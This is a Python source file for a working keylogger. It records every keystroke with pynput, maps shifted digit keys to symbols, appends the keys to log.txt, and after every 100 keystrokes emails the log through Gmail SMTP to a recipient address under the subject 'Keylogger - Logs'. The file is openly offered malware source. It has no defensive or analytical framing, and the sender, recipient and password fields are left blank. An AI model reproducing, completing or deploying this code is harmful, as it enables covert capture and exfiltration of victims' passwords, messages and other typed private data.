from pynput.keyboard import Key, Listener
#import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
import smtplib
import datetime


URL = "smtp.gmail.com"                   # Url SSL
PORT = 465                               # Port SSL

SENDER = '@gmail.com'              # Sender E-mail
RECIPIENT = '@gmail.com'        # Recipient E-mail
PASSWORD = ''                         # Your Password

FILENAME = "log.txt"
LOCK_KEY = False

count = 0


def sendEmail():

    # create message object instance
    msg = MIMEMultipart()

    # setup the parameters of the message
    password = PASSWORD
    msg['From'] = SENDER
    msg['To'] = RECIPIENT
    msg['Subject'] = "Keylogger - Logs (" + str(datetime.datetime.now()) + ")"

    # add in the message body
    message = "Test send files in email"

    fpTxt = open(FILENAME, 'rb')
    doc = MIMEImage(fpTxt.read(), _subtype="txt")
    fpTxt.close()

    msg.attach(MIMEText(message, 'plain'))
    msg.attach(doc)


    server = smtplib.SMTP_SSL(URL, PORT)
    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()


def specialKey(n):
    if(n.isdigit()):
        if n == '1':
            return "!"
        elif n == '2':
            return "@"
        elif n == '3':
            return "#"
        elif n == '4':
            return "$"
        elif n == '5':
            return "%"
        elif n == '6':
            return "¨"
        elif n == '7':
            return "&"
        elif n == '8':
            return "*"
        elif n == '9':
            return "("
        elif n == '0':
            return ")"
        else:
            return "key.unknown"
    elif (n == "-"):
        return "_"
    else:
        return n.upper()

#dicionário com as teclas a serem traduzidas
translate_keys = {
    "Key.space": " ",
    "Key.enter": "\n",
    "Key.alt_l": "",
    "Key.alt_r": "",
    "Key.ctrl_l": "",
    "Key.ctrl_r": "",
    "Key.esc": "",
    "Key.cmd": "",
    "Key.caps_lock": "",
    "Key.backspace": "  ",
    "Key.tab": "	",
    "Key.up": "",
    "Key.down": "",
    "Key.left": "",
    "Key.right": "",
    "plus": "+",
    "alt+tab": "[alt+tab]",
    }


def writeFile(txt):
    global count
    #abrir o arquivo de log no modo append
    with open(FILENAME, "a") as f:
        f.write(txt)
        count += 1


def on_release(key):
    global LOCK_KEY
    #print('{0} released'.format(key))
    if(key == Key.shift_r or key == Key.shift):
        LOCK_KEY = False


def on_press(key):
    global LOCK_KEY
    global count

    if(str(key).startswith("'") and str(key).endswith("'")):
        tempKey = str(key).replace("'", "")
    else:
        tempKey = str(key)

    for key in translate_keys:
       #key recebe a chave do dicionário translate_keys
       #substituir a chave (key) pelo seu valor (translate_keys[key])
       tempKey = tempKey.replace(key, translate_keys[key])

    if (tempKey.__contains__("shift")):
        LOCK_KEY = True
    elif (LOCK_KEY):
        writeFile(specialKey(tempKey))
    else:
        writeFile(tempKey)

    if(count >= 100):
        sendEmail()
        count = 0


# __MAIN__

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
